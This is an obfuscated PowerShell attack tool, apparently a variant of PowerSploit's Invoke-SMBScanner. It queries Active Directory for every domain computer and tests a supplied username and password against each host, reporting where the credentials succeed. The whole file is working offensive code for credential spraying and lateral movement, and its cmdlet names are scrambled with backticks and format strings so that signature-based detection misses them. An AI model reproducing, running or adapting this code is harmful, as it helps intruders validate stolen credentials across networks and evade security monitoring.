function I`Nv`oK`e-smbscaNN`er {

    
    [CmdletBinding()] Param(
        [Parameter(maNdAtORy = ${fA`lsE},vAlUefROmPipeliNe=${Tr`UE})]
        [String] ${c`oMPUTe`R`Name},

        [parameter(maNdAtORy = ${t`RuE})]
        [String] ${U`s`ername},

        [parameter(maNdAtORy = ${Tr`UE})]
        [String] ${pA`S`sworD},

        [parameter(mAndatoRy = ${FA`l`Se})]
        [Switch] ${nopi`Ng}
    )

    Begin {
        &("{1}{2}{0}"-f 'e','Se','t-StrictMod') -Version 2
        
        Try {&("{2}{1}{0}"-f 'e','d-Typ','Ad') -AssemblyName ("{1}{2}{5}{9}{8}{3}{10}{4}{7}{0}{6}"-f'ntM','S','ystem.','yS','es.Acc','Di','anagement','ou','tor','rec','ervic')}
        Catch {&("{0}{2}{1}" -f'Wr','Error','ite-') ${e`RR`or}[0].("{1}{0}"-f 'ing','ToStr').Invoke() ('+') ${Er`ROR}[0]."iN`VocaT`I`OninFo"."pos`ITio`N`MEsSaGe"}
    }

    Process {

        ${CoM`puTeR`Na`MES} = @()

        
        if(-not ${CO`M`PuT`Er`NAme}){
            &("{2}{1}{0}"-f 'se','te-Verbo','Wri') ("{1}{7}{8}{0}{6}{3}{5}{4}{2}" -f 'or ','Querying ','nes.','c','machi','tive ','a','t','he domain f')
            ("{6}{9}{5}{7}{4}{2}{8}{11}{0}{12}{10}{1}{3}" -f 'tiv','nes','ain ','.','e dom','g t','Query','h','f','in',' machi','or ac','e')

            ${c`OMp`UTe`RnA`Mes} = [array] ([adsisearcher]("{2}{1}{4}{3}{0}"-f'er','at','objectC','ut','egory=Comp')).("{0}{1}{2}" -f'Fi','nd','all').Invoke() | &("{2}{1}{0}" -f'h','rEac','Fo') {${_}."P`R`opERTIES"."C`N"}

            .("{3}{2}{1}{4}{0}" -f'e','Verbo','e-','Writ','s') "Retrived $($ComputerNames.Length) systems from the domain. "
        }
        else {
            ${Co`mPuT`e`RNaMES} = @(${C`om`PuTeRNA`Me})
        }

        foreach (${comp`UTEr} in ${c`OMP`UteRn`AMES}){     

            Try {
                
                .("{1}{2}{0}{3}" -f '-Verbo','Wri','te','se') ('Check'+'i'+'ng: '+"$Computer")

                ${UP} = ${Tr`UE}
                if(-not ${n`opi`Ng}){
                    ${up} = .("{1}{2}{3}{0}{4}" -f 'Connect','Te','st','-','ion') -count 1 -Quiet -ComputerName ${C`omPUtER} 
                }
                if(${U`p}){

                    if (${uS`er`NamE}.("{0}{1}"-f 'conta','ins').Invoke("\\")) {
                        
                        ${CONTe`Xt`T`YpE} = [System.DirectoryServices.AccountManagement.ContextType]::"DO`mAiN"
                    }
                    else{
                        
                        ${C`OnT`exTTypE} = [System.DirectoryServices.AccountManagement.ContextType]::"maC`HIne"
                    }

                    ${p`R`iNCiPAl`CO`Ntext} = .("{2}{0}{1}" -f'ew-Obje','ct','N') ("{0}{9}{3}{16}{13}{2}{10}{12}{15}{8}{4}{14}{6}{7}{11}{1}{5}{17}"-f 'S','pa','ervi','s','g','l','e','nt.Princ','tMana','y','c','i','es.Acc','.DirectoryS','em','oun','tem','Context')(${C`O`Nt`ExttYpE}, ${c`o`mpUtER})
                
                    ${v`AL`id} = ${PR`In`C`i`palContext}.("{0}{1}{4}{5}{3}{2}"-f'Valid','a','ials','Credent','t','e').Invoke(${U`s`eRNamE}, ${P`AsswORD}).("{0}{1}{2}"-f'To','S','tring').Invoke()
                    
                    If (${vAL`id}) {
                        &("{1}{2}{3}{0}" -f 'e','Wr','ite-','Verbos') ('SUC'+'CE'+'SS: '+"$Username "+'works'+' '+'with'+' '+"$Password "+'on'+' '+"$Computer")

                        ${O`Ut} = &("{3}{0}{1}{2}" -f'bj','e','ct','new-o') ("{0}{1}"-f'ps','object')
                        ${o`UT} | &("{0}{2}{1}" -f'add-memb','r','e') ("{2}{1}{0}"-f'y','opert','Notepr') ("{0}{1}{2}"-f 'Co','m','puterName') ${c`oMP`UTER}
                        ${o`UT} | .("{0}{2}{1}{3}" -f'a','membe','dd-','r') ("{1}{2}{0}{3}"-f'er','Notepro','p','ty') ("{0}{1}{2}" -f 'U','serna','me') ${UseRn`A`Me}
                        ${O`Ut} | .("{1}{2}{0}" -f'ber','ad','d-mem') ("{0}{2}{1}"-f 'N','property','ote') ("{0}{1}"-f'Pa','ssword') ${p`As`swORD}
                        ${O`UT}
                    }
                
                    Else {
                        .("{2}{1}{0}"-f'se','te-Verbo','Wri') ('FAILU'+'R'+'E: '+"$Username "+'d'+'id '+'no'+'t '+'work'+' '+'w'+'ith '+"$Password "+'o'+'n '+"$ComputerName")
                    }
                }
            }

            Catch {&("{2}{1}{0}"-f'-Error','rite','W') $(${Er`Ror}[0].("{0}{2}{1}" -f'ToSt','g','rin').Invoke() + ${E`RR`oR}[0]."In`V`oCAt`ioniNfO"."pos`ITI`oNme`SSA`ge")}
        }
    }
}